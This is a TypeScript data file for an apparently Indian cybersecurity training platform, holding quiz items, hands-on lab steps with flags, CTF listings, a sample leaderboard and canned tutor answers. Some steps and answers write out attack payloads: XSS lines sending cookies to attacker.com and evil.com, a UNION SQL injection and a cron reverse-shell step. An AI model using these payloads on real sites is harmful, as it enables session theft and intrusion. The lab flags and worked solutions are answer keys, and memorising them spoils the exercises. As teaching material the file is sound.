export interface Lab {
  id: string
  title: string
  description: string
  category: string
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert'
  duration: number
  xpReward: number
  flag: string
  steps: string[]
  hints: string[]
}

export interface CTFChallenge {
  id: string
  title: string
  description: string
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert'
  points: number
  category: string
  participants: number
  timeRemaining: string
  flag: string
}

export interface LeaderboardEntry {
  rank: number
  name: string
  college: string
  state: string
  points: number
  tier: string
  avatar: string
}

export interface AssessmentQuestion {
  id: number
  question: string
  options: string[]
  correct: number
  category: string
  tier: 'egg' | 'hatch' | 'fly'
}

export const assessmentQuestions: AssessmentQuestion[] = [
  {
    id: 1,
    question: 'What does "IP" stand for in networking?',
    options: ['Internet Protocol', 'Intranet Portal', 'Integrated Process', 'Input Packet'],
    correct: 0,
    category: 'networking',
    tier: 'egg',
  },
  {
    id: 2,
    question: 'Which command shows your current directory in Linux?',
    options: ['ls', 'pwd', 'cd', 'cat'],
    correct: 1,
    category: 'linux',
    tier: 'egg',
  },
  {
    id: 3,
    question: 'What does HTTP stand for?',
    options: ['HyperText Transfer Protocol', 'High Tech Transfer Program', 'HyperText Transmission Process', 'Home Tool Transfer Protocol'],
    correct: 0,
    category: 'networking',
    tier: 'egg',
  },
  {
    id: 4,
    question: 'What is the default SSH port?',
    options: ['80', '443', '22', '8080'],
    correct: 2,
    category: 'networking',
    tier: 'hatch',
  },
  {
    id: 5,
    question: 'What does SQL stand for?',
    options: ['Simple Query Language', 'Structured Query Language', 'Standard Query Logic', 'Sequential Query Language'],
    correct: 1,
    category: 'web',
    tier: 'hatch',
  },
  {
    id: 6,
    question: 'What is a "man-in-the-middle" attack?',
    options: ['Attacking a person physically', 'Intercepting communication between two parties', 'Hacking a middle server', 'Breaking encryption in transit'],
    correct: 1,
    category: 'security',
    tier: 'hatch',
  },
  {
    id: 7,
    question: 'What does the "chmod 777" command do in Linux?',
    options: ['Deletes a file', 'Gives full read/write/execute permissions to everyone', 'Changes the owner', 'Encrypts a file'],
    correct: 1,
    category: 'linux',
    tier: 'fly',
  },
  {
    id: 8,
    question: 'What type of vulnerability allows an attacker to inject malicious SQL queries?',
    options: ['XSS', 'CSRF', 'SQL Injection', 'IDOR'],
    correct: 2,
    category: 'web',
    tier: 'fly',
  },
  {
    id: 9,
    question: 'In cryptography, what does AES stand for?',
    options: ['Advanced Encryption Standard', 'Automated Encryption System', 'Analog Encryption Standard', 'Applied Encryption Scheme'],
    correct: 0,
    category: 'crypto',
    tier: 'fly',
  },
  {
    id: 10,
    question: 'What is a "buffer overflow"?',
    options: ['Running out of memory', 'Writing data beyond buffer boundaries', 'A type of DDoS attack', 'A network congestion issue'],
    correct: 1,
    category: 'security',
    tier: 'fly',
  },
]

export const labs: Lab[] = [
  // Networking Basics
  {
    id: 'net-1',
    title: 'Packet Sniffing with Wireshark',
    description: 'Learn to capture and analyze network packets using Wireshark. Understand TCP handshakes, HTTP requests, and DNS lookups.',
    category: 'Networking',
    difficulty: 'Easy',
    duration: 30,
    xpReward: 50,
    flag: 'FLAG{p4ck3t_sn1ff3r_m4st3r}',
    steps: [
      'Open Wireshark and select your network interface',
      'Start a packet capture and visit http://example.com',
      'Filter for HTTP packets using: http',
      'Find the HTTP GET request and examine the headers',
      'Look for the User-Agent string in the request',
      'The flag is hidden in the response headers: FLAG{p4ck3t_sn1ff3r_m4st3r}',
    ],
    hints: [
      'Look for the filter bar at the top of Wireshark',
      'HTTP traffic uses port 80 by default',
      'Response headers come after the request in the packet details',
    ],
  },
  {
    id: 'net-2',
    title: 'ARP Spoofing Fundamentals',
    description: 'Understand how ARP works and how attackers exploit it. Simulate an ARP spoof in a controlled lab environment.',
    category: 'Networking',
    difficulty: 'Medium',
    duration: 45,
    xpReward: 100,
    flag: 'FLAG{4rp_p01s0n1ng_d3t3ct3d}',
    steps: [
      'Examine the ARP cache: arp -a',
      'Understand how ARP maps IP addresses to MAC addresses',
      'Use arpspoof to redirect traffic (simulated environment)',
      'Monitor the traffic redirection with Wireshark',
      'Detect the spoof by comparing original and spoofed ARP tables',
      'The flag is revealed when you successfully detect the spoof: FLAG{4rp_p01s0n1ng_d3t3ct3d}',
    ],
    hints: [
      'ARP stands for Address Resolution Protocol',
      'The -t flag in arpspoof specifies the target',
      'Look for duplicate MAC addresses in your ARP table',
    ],
  },
  {
    id: 'net-3',
    title: 'DNS Reconnaissance',
    description: 'Learn to perform DNS enumeration and understand how DNS works. Use dig, nslookup, and DNSrecon tools.',
    category: 'Networking',
    difficulty: 'Easy',
    duration: 25,
    xpReward: 50,
    flag: 'FLAG{dns_r3c0n_k1ng}',
    steps: [
      'Use nslookup to query DNS records for the target domain',
      'Use dig to find MX (mail exchange) records',
      'Enumerate subdomains using a wordlist with DNSrecon',
      'Find the hidden subdomain: secret.vaathi.local',
      'Query the TXT record for the hidden subdomain',
      'The flag is in the TXT record: FLAG{dns_r3c0n_k1ng}',
    ],
    hints: [
      'Try: dig vaathi.local MX',
      'DNSrecon -d vaathi.local -t brt -w wordlist.txt',
      'TXT records often contain interesting information',
    ],
  },
  // Web Hacking
  {
    id: 'web-1',
    title: 'SQL Injection 101',
    description: 'Learn the fundamentals of SQL injection on a deliberately vulnerable web application. Extract data from the database.',
    category: 'Web Hacking',
    difficulty: 'Easy',
    duration: 40,
    xpReward: 100,
    flag: 'FLAG{sql1_n0_m0r3_s4f3}',
    steps: [
      'Open the vulnerable login page at http://lab.vaathi.local/login',
      'Try a normal login to see how it works',
      'Enter admin\' in the username field',
      'Observe the SQL error message on the page',
      'Craft a UNION-based injection: \' UNION SELECT username, password FROM users--',
      'Extract the admin password hash from the response',
      'The flag is the admin\'s password: FLAG{sql1_n0_m0r3_s4f3}',
    ],
    hints: [
      'The single quote character breaks SQL strings',
      'UNION combines results from multiple SELECT statements',
      'You need to match the number of columns in the original query',
    ],
  },
  {
    id: 'web-2',
    title: 'Cross-Site Scripting (XSS)',
    description: 'Discover reflected and stored XSS vulnerabilities. Learn how to prevent them with proper output encoding.',
    category: 'Web Hacking',
    difficulty: 'Medium',
    duration: 50,
    xpReward: 100,
    flag: 'FLAG{x55_1s_n0t_4_j0k3}',
    steps: [
      'Navigate to the search page with a reflection point',
      'Test with: <script>alert(1)</script>',
      'Notice the input is reflected without sanitization',
      'Craft a stored XSS payload in the comment section',
      'Use <img src=x onerror="fetch(\'http://attacker.com/?c=\'+document.cookie)">',
      'Verify the payload executes when other users view the page',
      'The flag appears in the admin cookie: FLAG{x55_1s_n0t_4_j0k3}',
    ],
    hints: [
      'XSS works when user input is rendered as HTML without escaping',
      'Stored XSS is more dangerous than reflected XSS',
      'The Content-Security-Policy header can prevent XSS',
    ],
  },
  {
    id: 'web-3',
    title: 'CSRF Token Bypass',
    description: 'Learn about Cross-Site Request Forgery and how to find and bypass CSRF protections.',
    category: 'Web Hacking',
    difficulty: 'Medium',
    duration: 40,
    xpReward: 100,
    flag: 'FLAG{csrf_byp4ss_m4st3r}',
    steps: [
      'Identify a state-changing action (e.g., change email)',
      'Check if the request has a CSRF token',
      'Examine the token validation logic in the source code',
      'Find that the token is only checked in the session, not per-request',
      'Craft a CSRF PoC HTML page that forges the request',
      'Successfully bypass the protection and change the admin email',
      'The flag is in the admin\'s new email confirmation: FLAG{csrf_byp4ss_m4st3r}',
    ],
    hints: [
      'CSRF forces a logged-in user to perform unwanted actions',
      'Check if the token changes between requests',
      'Look at how the token is validated on the server side',
    ],
  },
  {
    id: 'web-4',
    title: 'IDOR Vulnerability Discovery',
    description: 'Find Insecure Direct Object Reference vulnerabilities by manipulating API endpoints.',
    category: 'Web Hacking',
    difficulty: 'Hard',
    duration: 60,
    xpReward: 200,
    flag: 'FLAG{1d0r_f0und_4nd_pwn3d}',
    steps: [
      'Log in as a normal user and capture the API requests',
      'Note the endpoint: /api/users/123/profile',
      'Change the user ID to 1 (admin) and observe the response',
      'You can now see the admin\'s profile including private data',
      'Try modifying other users\' data through the API',
      'Discover the /api/admin endpoint by fuzzing',
      'The flag is in the admin\'s private notes: FLAG{1d0r_f0und_4nd_pwn3d}',
    ],
    hints: [
      'IDOR is about accessing resources by changing identifiers',
      'Try incrementing and decrementing numeric IDs',
      'Look for horizontal (same role) and vertical (different role) privilege escalation',
    ],
  },
  // Linux & Terminal
  {
    id: 'linux-1',
    title: 'Linux File Permissions',
    description: 'Master Linux file permissions. Understand rwx, octal notation, and how misconfigured permissions lead to privilege escalation.',
    category: 'Linux',
    difficulty: 'Easy',
    duration: 30,
    xpReward: 50,
    flag: 'FLAG{p3rm1ss10ns_m4st3r3d}',
    steps: [
      'List files with permissions: ls -la',
      'Understand the rwx notation for user, group, and others',
      'Create a file and set permissions: chmod 755 file.txt',
      'Find the SUID bit: find / -perm -4000',
      'Discover a SUID binary that runs as root',
      'Exploit the misconfigured SUID binary to read /etc/shadow',
      'The flag is in the shadow file: FLAG{p3rm1ss10ns_m4st3r3d}',
    ],
    hints: [
      'SUID allows a file to run with the permissions of its owner',
      'The find command with -perm flag is very powerful',
      'Classic SUID binaries to check: find, vim, python, bash',
    ],
  },
  {
    id: 'linux-2',
    title: 'Bash Scripting for Hackers',
    description: 'Write bash scripts for automated reconnaissance, port scanning, and enumeration tasks.',
    category: 'Linux',
    difficulty: 'Medium',
    duration: 45,
    xpReward: 100,
    flag: 'FLAG{b4sh_scr1pt1ng_n1nj4}',
    steps: [
      'Create a simple port scanner: for port in {1..1000}; do ... done',
      'Add threading for faster scanning with & and wait',
      'Write a subdomain enumeration script using curl',
      'Create an automated recon script that combines multiple tools',
      'Make the script output results to a structured file',
      'Run your automated scanner against the lab target',
      'The flag is in the scan results of port 4444: FLAG{b4sh_scr1pt1ng_n1nj4}',
    ],
    hints: [
      'Use /dev/tcp/IP/PORT for bash-native port scanning',
      'The timeout command prevents hanging on closed ports',
      'Combine curl with jq for parsing JSON API responses',
    ],
  },
  {
    id: 'linux-3',
    title: 'Privilege Escalation - Linux',
    description: 'Learn common Linux privilege escalation techniques. Find your way from a low-privilege user to root.',
    category: 'Linux',
    difficulty: 'Hard',
    duration: 90,
    xpReward: 200,
    flag: 'FLAG{r00t_4cc3ss_gr4nt3d}',
    steps: [
      'Enumerate the system: uname -a, id, whoami, sudo -l',
      'Check for SUID binaries: find / -perm -4000 2>/dev/null',
      'Find a misconfigured cron job: cat /etc/crontab',
      'Discover a writable cron script',
      'Inject a reverse shell payload into the cron script',
      'Wait for cron to execute and receive your root shell',
      'Read /root/flag.txt: FLAG{r00t_4cc3ss_gr4nt3d}',
    ],
    hints: [
      'Always check sudo -l first — it reveals allowed commands',
      'LinPEAS and LinEnum are great automated enumeration tools',
      'Cron jobs running as root with writable scripts = instant root',
    ],
  },
  // Cryptography
  {
    id: 'crypto-1',
    title: 'Caesar Cipher Cracker',
    description: 'Build your own Caesar cipher cracker. Learn the fundamentals of classical cryptography.',
    category: 'Cryptography',
    difficulty: 'Easy',
    duration: 20,
    xpReward: 50,
    flag: 'FLAG{cl4ss1c4l_crypt0_pr0}',
    steps: [
      'Understand how the Caesar cipher shifts letters',
      'Write a Python script to try all 26 possible shifts',
      'Apply frequency analysis to identify the correct shift',
      'Decrypt the given ciphertext: "GUR DHVXYL ZNQ UV RA JVYYvat"',
      'Identify the shift value used (13 — ROT13)',
      'Read the decrypted message to find the flag: FLAG{cl4ss1c4l_crypt0_pr0}',
    ],
    hints: [
      'ROT13 is the most common Caesar shift (13 positions)',
      'In English, "E" is the most frequent letter',
      'The ciphertext "GUR" decrypts to "THE" with ROT13',
    ],
  },
  {
    id: 'crypto-2',
    title: 'RSA Key Analysis',
    description: 'Understand RSA encryption by analyzing keys, factoring small moduli, and recovering plaintext.',
    category: 'Cryptography',
    difficulty: 'Hard',
    duration: 60,
    xpReward: 200,
    flag: 'FLAG{rs4_f4ct0r3d_4nd_cr4ck3d}',
    steps: [
      'Examine the RSA public key: n = 3233, e = 17',
      'Factor n into its prime components: p = 61, q = 53',
      'Calculate phi(n) = (p-1)(q-1) = 3120',
      'Find the private exponent d: d = e^(-1) mod phi(n)',
      'Use d to decrypt the ciphertext c = 2790',
      'Convert the decrypted number to text using ASCII',
      'The plaintext contains the flag: FLAG{rs4_f4ct0r3d_4nd_cr4ck3d}',
    ],
    hints: [
      'RSA security depends on the difficulty of factoring large numbers',
      'For small n, trial division works for factoring',
      'The extended Euclidean algorithm finds modular inverses',
    ],
  },
  // Malware Analysis
  {
    id: 'malware-1',
    title: 'Static Malware Analysis',
    description: 'Analyze a suspected malware sample using static analysis techniques. Extract strings, imports, and indicators.',
    category: 'Malware',
    difficulty: 'Hard',
    duration: 75,
    xpReward: 200,
    flag: 'FLAG{m4lw4r3_4n4lys1s_pr0}',
    steps: [
      'Check file hash: sha256sum malware.bin',
      'Search the hash on VirusTotal (simulated)',
      'Extract strings: strings malware.bin | grep -i "http"',
      'Examine PE headers and imports with objdump/readelf',
      'Identify the C2 server URL in the extracted strings',
      'Analyze the XOR decryption routine in the disassembly',
      'Decrypt the payload to reveal the flag: FLAG{m4lw4r3_4n4lys1s_pr0}',
    ],
    hints: [
      'File hashes help identify known malware families',
      'The "strings" command is your first tool for static analysis',
      'Look for URLs, IP addresses, and unusual API calls in imports',
    ],
  },
  // Indian Context Labs
  {
    id: 'india-1',
    title: 'UPI Payment Flow Analysis',
    description: 'Understand how UPI payments work under the hood. Identify potential fraud vectors in the payment flow.',
    category: 'Indian Context',
    difficulty: 'Medium',
    duration: 45,
    xpReward: 100,
    flag: 'FLAG{up1_s3cur1ty_4ud1t0r}',
    steps: [
      'Examine the UPI payment request/response structure',
      'Identify the VPA (Virtual Payment Address) validation logic',
      'Find a missing amount validation in the merchant callback',
      'Craft a manipulated callback with a lower amount',
      'Understand how replay attacks could work on UPI links',
      'Document the vulnerability and write a proof of concept',
      'The flag is in the audit report: FLAG{up1_s3cur1ty_4ud1t0r}',
    ],
    hints: [
      'UPI uses NPCI infrastructure — understand the architecture',
      'Merchant callbacks should always verify the payment amount server-side',
      'Collect requests are more secure than payment links',
    ],
  },
  {
    id: 'india-2',
    title: 'Aadhaar Phishing Simulation',
    description: 'Detect and analyze phishing attacks that impersonate Aadhaar services. Build awareness of social engineering.',
    category: 'Indian Context',
    difficulty: 'Easy',
    duration: 30,
    xpReward: 50,
    flag: 'FLAG{ph1sh1ng_d3t3ct1v3}',
    steps: [
      'Examine a suspicious email claiming to be from UIDAI',
      'Check the sender domain — it\'s uidai-update.com (not uidai.gov.in)',
      'Analyze the phishing page HTML structure',
      'Identify the form that captures Aadhaar number and OTP',
      'Find the hidden iframe that exfiltrates data',
      'Write a detection rule for this phishing pattern',
      'The flag is embedded in the phishing page source: FLAG{ph1sh1ng_d3t3ct1v3}',
    ],
    hints: [
      'Always check the sender domain carefully',
      'Government websites always end with .gov.in',
      'Look for HTTPS and the green padlock icon',
    ],
  },
  {
    id: 'india-3',
    title: 'OTP Bypass Mechanics',
    description: 'Understand how OTP-based authentication can be bypassed. Learn to build more secure OTP systems.',
    category: 'Indian Context',
    difficulty: 'Medium',
    duration: 50,
    xpReward: 100,
    flag: 'FLAG{0tp_s3cur1ty_h4rd3n3d}',
    steps: [
      'Examine the OTP generation and verification logic',
      'Find that the OTP is a simple sequential number',
      'Write a script to brute-force the 4-digit OTP',
      'Discover there is no rate limiting on OTP verification',
      'Identify the OTP is sent over an insecure channel',
      'Propose fixes: rate limiting, random OTP, expiry, secure channel',
      'The flag is revealed after successful bypass: FLAG{0tp_s3cur1ty_h4rd3n3d}',
    ],
    hints: [
      '4-digit OTPs with no rate limit can be brute-forced in 10000 attempts',
      'OTPs should be cryptographically random and time-limited',
      'Always implement rate limiting on verification endpoints',
    ],
  },
]

export const ctfChallenges: CTFChallenge[] = [
  {
    id: 'ctf-1',
    title: 'Fake Govt Portal Takeover',
    description: 'A fake government portal has been set up. Find the SQL injection vulnerability and extract the citizen database.',
    difficulty: 'Easy',
    points: 100,
    category: 'Web',
    participants: 1247,
    timeRemaining: '5d 12h',
    flag: 'FLAG{g0vt_p0rt4l_pwn3d}',
  },
  {
    id: 'ctf-2',
    title: 'Banking App Exploit',
    description: 'A mock banking application has a critical vulnerability. Exploit the IDOR to access other users\' account balances.',
    difficulty: 'Medium',
    points: 250,
    category: 'Web',
    participants: 834,
    timeRemaining: '3d 8h',
    flag: 'FLAG{b4nk_h34st}',
  },
  {
    id: 'ctf-3',
    title: 'Network Forensics Challenge',
    description: 'Analyze a provided PCAP file from a suspected data breach. Find the exfiltrated data and the attacker\'s IP.',
    difficulty: 'Hard',
    points: 500,
    category: 'Forensics',
    participants: 423,
    timeRemaining: '7d 0h',
    flag: 'FLAG{f0r3ns1cs_w1z4rd}',
  },
  {
    id: 'ctf-4',
    title: 'Crypto Puzzle: Ancient Cipher',
    description: 'Decrypt a message encrypted with a combination of Vigenere and substitution ciphers.',
    difficulty: 'Medium',
    points: 300,
    category: 'Crypto',
    participants: 567,
    timeRemaining: '4d 16h',
    flag: 'FLAG{4nc13nt_c1ph3r_cr4ck3d}',
  },
  {
    id: 'ctf-5',
    title: 'Reverse Engineering: CrackMe',
    description: 'A binary asks for a password. Reverse engineer it to find the correct password.',
    difficulty: 'Hard',
    points: 400,
    category: 'Reverse',
    participants: 312,
    timeRemaining: '6d 4h',
    flag: 'FLAG{r3v3rs3_pr0}',
  },
  {
    id: 'ctf-6',
    title: 'UPI Fraud Detection',
    description: 'Identify the fraudulent transactions in a dataset of 1000 UPI payments. Flag the anomalies.',
    difficulty: 'Easy',
    points: 150,
    category: 'Indian Context',
    participants: 891,
    timeRemaining: '2d 20h',
    flag: 'FLAG{fr4ud_d3t3ct3d}',
  },
  {
    id: 'ctf-7',
    title: 'Container Escape',
    description: 'You\'re inside a Docker container. Find a misconfiguration and escape to the host system.',
    difficulty: 'Expert',
    points: 750,
    category: 'System',
    participants: 89,
    timeRemaining: '10d 0h',
    flag: 'FLAG{c0nt41n3r_3sc4p3d}',
  },
  {
    id: 'ctf-8',
    title: 'Web Shell Hunt',
    description: 'A web server has been compromised with a web shell. Find it among 10,000 files.',
    difficulty: 'Medium',
    points: 200,
    category: 'Web',
    participants: 645,
    timeRemaining: '3d 0h',
    flag: 'FLAG{sh3ll_f0und}',
  },
]

export const leaderboard: LeaderboardEntry[] = [
  { rank: 1, name: 'Arjun Sharma', college: 'IIT Bombay', state: 'Maharashtra', points: 28450, tier: 'burn', avatar: 'AS' },
  { rank: 2, name: 'Priya Nair', college: 'NIT Trichy', state: 'Tamil Nadu', points: 25600, tier: 'burn', avatar: 'PN' },
  { rank: 3, name: 'Rahul Verma', college: 'IIIT Hyderabad', state: 'Telangana', points: 23100, tier: 'burn', avatar: 'RV' },
  { rank: 4, name: 'Ananya Gupta', college: 'BITS Pilani', state: 'Rajasthan', points: 21800, tier: 'soar', avatar: 'AG' },
  { rank: 5, name: 'Karthik Rajan', college: 'VIT Vellore', state: 'Tamil Nadu', points: 19950, tier: 'soar', avatar: 'KR' },
  { rank: 6, name: 'Deepak Patel', college: 'IIT Delhi', state: 'Delhi', points: 18700, tier: 'soar', avatar: 'DP' },
  { rank: 7, name: 'Sneha Iyer', college: 'NIT Surathkal', state: 'Karnataka', points: 17200, tier: 'soar', avatar: 'SI' },
  { rank: 8, name: 'Vikram Singh', college: 'DTU Delhi', state: 'Delhi', points: 15800, tier: 'soar', avatar: 'VS' },
  { rank: 9, name: 'Meera Krishnan', college: 'CET Trivandrum', state: 'Kerala', points: 14500, tier: 'fly', avatar: 'MK' },
  { rank: 10, name: 'Aditya Joshi', college: 'COEP Pune', state: 'Maharashtra', points: 13200, tier: 'fly', avatar: 'AJ' },
  { rank: 11, name: 'Roshni Das', college: 'Jadavpur University', state: 'West Bengal', points: 12100, tier: 'fly', avatar: 'RD' },
  { rank: 12, name: 'Nikhil Reddy', college: 'IIT Madras', state: 'Tamil Nadu', points: 11400, tier: 'fly', avatar: 'NR' },
  { rank: 13, name: 'Sakshi Sharma', college: 'MNIT Jaipur', state: 'Rajasthan', points: 10800, tier: 'fly', avatar: 'SS' },
  { rank: 14, name: 'Arun Kumar', college: 'NIT Warangal', state: 'Telangana', points: 9900, tier: 'fly', avatar: 'AK' },
  { rank: 15, name: 'Divya Menon', college: 'IIT Gandhinagar', state: 'Gujarat', points: 9200, tier: 'fly', avatar: 'DM' },
  { rank: 16, name: 'Harsh Agarwal', college: 'IIIT Allahabad', state: 'Uttar Pradesh', points: 8500, tier: 'fly', avatar: 'HA' },
  { rank: 17, name: 'Kavitha Raman', college: 'SRM Chennai', state: 'Tamil Nadu', points: 7800, tier: 'hatch', avatar: 'KR' },
  { rank: 18, name: 'Rohan Mehta', college: 'IIT Roorkee', state: 'Uttarakhand', points: 7100, tier: 'hatch', avatar: 'RM' },
  { rank: 19, name: 'Ishita Banerjee', college: 'IIT Kharagpur', state: 'West Bengal', points: 6500, tier: 'hatch', avatar: 'IB' },
  { rank: 20, name: 'Sanjay Kumar', college: 'NIT Durgapur', state: 'West Bengal', points: 5900, tier: 'hatch', avatar: 'SK' },
]

export const thirtyDayRoadmap = [
  { day: 1, title: 'What is Cybersecurity?', type: 'learn', xp: 20 },
  { day: 2, title: 'Setting Up Your Lab', type: 'setup', xp: 30 },
  { day: 3, title: 'Networking Basics', type: 'learn', xp: 25 },
  { day: 4, title: 'Lab: Packet Sniffing', type: 'lab', xp: 50 },
  { day: 5, title: 'Linux Essentials', type: 'learn', xp: 25 },
  { day: 6, title: 'Lab: File Permissions', type: 'lab', xp: 50 },
  { day: 7, title: 'Weekly CTF Challenge', type: 'ctf', xp: 100 },
  { day: 8, title: 'How the Web Works', type: 'learn', xp: 30 },
  { day: 9, title: 'HTTP Headers Deep Dive', type: 'learn', xp: 35 },
  { day: 10, title: 'Lab: SQL Injection', type: 'lab', xp: 100 },
  { day: 11, title: 'Lab: XSS Attacks', type: 'lab', xp: 100 },
  { day: 12, title: 'Cryptography Basics', type: 'learn', xp: 30 },
  { day: 13, title: 'Lab: Caesar Cipher', type: 'lab', xp: 50 },
  { day: 14, title: 'Weekly CTF Challenge', type: 'ctf', xp: 150 },
  { day: 15, title: 'Indian Context: UPI Security', type: 'learn', xp: 35 },
  { day: 16, title: 'Lab: UPI Flow Analysis', type: 'lab', xp: 100 },
  { day: 17, title: 'Advanced SQLi Techniques', type: 'learn', xp: 40 },
  { day: 18, title: 'Lab: IDOR Discovery', type: 'lab', xp: 200 },
  { day: 19, title: 'Privilege Escalation', type: 'learn', xp: 45 },
  { day: 20, title: 'Lab: Linux PrivEsc', type: 'lab', xp: 200 },
  { day: 21, title: 'Weekly CTF Challenge', type: 'ctf', xp: 200 },
  { day: 22, title: 'Malware Analysis Intro', type: 'learn', xp: 40 },
  { day: 23, title: 'Lab: Static Analysis', type: 'lab', xp: 200 },
  { day: 24, title: 'Network Forensics', type: 'learn', xp: 45 },
  { day: 25, title: 'Lab: CSRF & Advanced Web', type: 'lab', xp: 100 },
  { day: 26, title: 'RSA & Modern Crypto', type: 'learn', xp: 50 },
  { day: 27, title: 'Lab: RSA Key Analysis', type: 'lab', xp: 200 },
  { day: 28, title: 'Bug Bounty Writing', type: 'learn', xp: 40 },
  { day: 29, title: 'Mock Interview Prep', type: 'learn', xp: 50 },
  { day: 30, title: 'Final CTF: Everything Combined', type: 'ctf', xp: 500 },
]

export const guruResponses: Record<string, string> = {
  'what is sql injection': `**SQL Injection (SQLi)** is when an attacker inserts malicious SQL code into a query that an application makes to its database.

Think of it like this: Imagine you're at a restaurant and the waiter takes your order. Normally you'd say "I want paneer butter masala." But what if you say "I want paneer butter masala AND give me the recipe book"? If the waiter is dumb enough to pass that whole sentence to the kitchen, you just got the secret recipe!

In code terms:
- Normal input: \`username = "admin"\`
- Malicious input: \`username = "admin' OR '1'='1"\`
- The query becomes: \`SELECT * FROM users WHERE username = 'admin' OR '1'='1'\`
- This returns ALL users because \`1=1\` is always true!

**How to prevent it:**
1. Use **parameterized queries** (prepared statements)
2. Use an **ORM** like Prisma or SQLAlchemy
3. **Validate and sanitize** all user inputs
4. Apply **least privilege** to database users`,
  
  'what is xss': `**Cross-Site Scripting (XSS)** is when an attacker injects malicious JavaScript into a web page that other users view.

Imagine you're passing notes in class. You write a normal note and pass it to your friend. But what if someone slips a tiny invisible instruction into the note that makes your friend do something they didn't intend to — like giving away their lunch money? That's XSS!

**Three types:**
1. **Reflected XSS** — The malicious script is in the URL/request and reflected back in the response. Like a mirror that shows back whatever you put in front of it.

2. **Stored XSS** — The script is saved in the database (like in a comment) and runs every time someone views it. This is more dangerous!

3. **DOM-based XSS** — The script manipulates the page's DOM without the server knowing.

**Real example:** A forum where you can post comments. You type:
\`<script>fetch('http://evil.com?cookie='+document.cookie)</script>\`
When other users view your comment, their cookies get sent to the attacker!`,

  'what is arp spoofing': `**ARP Spoofing** is a network attack where an attacker sends falsified ARP (Address Resolution Protocol) messages to link their MAC address with the IP address of a legitimate device.

Think of ARP like the office intercom system. When your computer wants to talk to the router, it broadcasts "Hey, who has IP 192.168.1.1? Tell me your MAC address!" The router responds with its MAC address.

Now imagine a sneaky person who keeps shouting "I'm 192.168.1.1! My MAC address is AA:BB:CC:DD:EE:FF!" If they shout louder and more often than the real router, other computers start sending their traffic to the attacker instead.

**What the attacker can do:**
1. **Intercept** all network traffic (Man-in-the-Middle)
2. **Modify** packets in transit
3. **Drop** packets causing a Denial of Service
4. **Sniff** passwords and session cookies

**How to detect it:**
- Run \`arp -a\` and look for duplicate MAC addresses for different IPs
- Use tools like **arpwatch** or **XArp** to detect ARP anomalies
- Check for MAC addresses from vendors that don't match the device type`,

  'what is buffer overflow': `A **Buffer Overflow** is when a program writes more data to a buffer (temporary storage) than it can hold, causing the excess data to overflow into adjacent memory locations.

Imagine you have a glass that can hold 250ml of water. If you pour 500ml into it, the extra 250ml spills everywhere. In programming, the "spilled" data overwrites whatever is stored next to the buffer in memory.

**Why is this dangerous?**
Programs have specific areas in memory:
- Buffer (your data)
- Return address (where to go after the function finishes)
- Other important data

If you overflow the buffer with carefully crafted data, you can **overwrite the return address** and make the program execute YOUR code instead of returning normally. This is called **code execution**.

**Simple example in C:**
\`\`\`c
char buffer[64];
gets(buffer); // Dangerous! No length check
\`\`\`
If someone types 200 characters, the extra 136 characters overflow into other memory.

**Prevention:**
1. Use safe functions like \`strncpy()\` instead of \`gets()\`
2. Use modern languages (Python, Java, Rust) that handle memory automatically
3. Enable stack canaries and ASLR (Address Space Layout Randomization)`,

  'what is cryptography': `**Cryptography** is the art and science of securing communication so that only the intended recipient can read it. It's been around for centuries!

**Think of it as a lockbox:**
- **Plaintext** = Your letter (readable)
- **Encryption** = Putting it in the lockbox and locking it
- **Ciphertext** = The locked box (unreadable gibberish to others)
- **Decryption** = Opening the box with the key
- **Key** = The physical key to the lockbox

**Two main types:**

1. **Symmetric Encryption** — Same key locks and unlocks
   - Like your house key: one key for lock and unlock
   - Examples: AES, DES, 3DES
   - Fast but key distribution is a problem

2. **Asymmetric Encryption** — Two different keys (public + private)
   - Like a padlock: anyone can lock it (public key), only you can unlock (private key)
   - Examples: RSA, ECC, Diffie-Hellman
   - Slower but solves the key distribution problem

**In the real world:**
- HTTPS uses TLS (combines both types)
- Your WhatsApp messages are end-to-end encrypted
- Digital signatures verify who sent a message
- Passwords are hashed (one-way encryption)`,

  'how to start ethical hacking': `**Getting started with ethical hacking** is actually simpler than you think! Here's my recommended path:

**Month 1: Foundations**
- Learn basic **networking** (TCP/IP, DNS, HTTP)
- Get comfortable with **Linux** (Ubuntu or Kali)
- Learn **Python** — it's the hacker's Swiss army knife
- Complete Vaathi's Egg-tier labs!

**Month 2-3: Web Security**
- Learn how web apps work (HTML, CSS, JS, databases)
- Master **OWASP Top 10** vulnerabilities
- Practice on **TryHackMe** (free rooms) and Vaathi labs
- Try your first CTF on Vaathi Arena!

**Month 4-6: Going Deeper**
- Learn **network hacking** (Wireshark, Nmap, Metasploit)
- Study **cryptography** basics
- Start **bug bounty** programs (HackerOne, Bugcrowd)
- Join **cybersecurity communities** (null, r00t, Bi0s)

**Month 6+: Specialize**
Choose your path:
- 🏗️ **Penetration Testing** — Breaking into systems legally
- 🔍 **Digital Forensics** — Investigating cyber crimes
- 🦠 **Malware Analysis** — Studying viruses and worms
- 🛡️ **Blue Team** — Defending systems
- 🔐 **Cryptography** — The math behind security

**Key mindset:** Always stay legal, always get permission, and remember — with great power comes great responsibility! 🕷️`,

  'default': `Great question! Let me explain this in a way that actually makes sense.

As your cybersecurity Guru, I'm here to break down complex concepts into simple, relatable explanations. Think of me as that one brilliant college senior who actually knows how to teach!

**Here's what I can help you with:**
- 🌐 **Networking** — How data travels across the internet
- 💻 **Web Security** — SQL injection, XSS, CSRF, and more
- 🐧 **Linux** — Command line mastery and privilege escalation
- 🔐 **Cryptography** — From Caesar ciphers to RSA
- 🦠 **Malware Analysis** — Understanding malicious software
- 🇮🇳 **Indian Context** — UPI security, Aadhaar phishing, OTP bypass

Try asking me something specific like "What is SQL injection?" or "How does ARP spoofing work?" and I'll give you a proper explanation with examples!`,
}

export const badgeDefinitions = [
  { id: 'first-login', name: 'First Steps', description: 'Joined Vaathi', icon: '🎯' },
  { id: 'assessment-complete', name: 'Self-Aware', description: 'Completed skill assessment', icon: '🧠' },
  { id: 'five-labs', name: 'Lab Rat', description: 'Completed 5 labs', icon: '🐀' },
  { id: 'ten-labs', name: 'Lab Warrior', description: 'Completed 10 labs', icon: '⚔️' },
  { id: 'first-ctf', name: 'CTF First Blood', description: 'Solved first CTF challenge', icon: '🩸' },
  { id: 'streak-7', name: 'Week Warrior', description: '7-day streak', icon: '🔥' },
  { id: 'streak-30', name: 'Unstoppable', description: '30-day streak', icon: '⚡' },
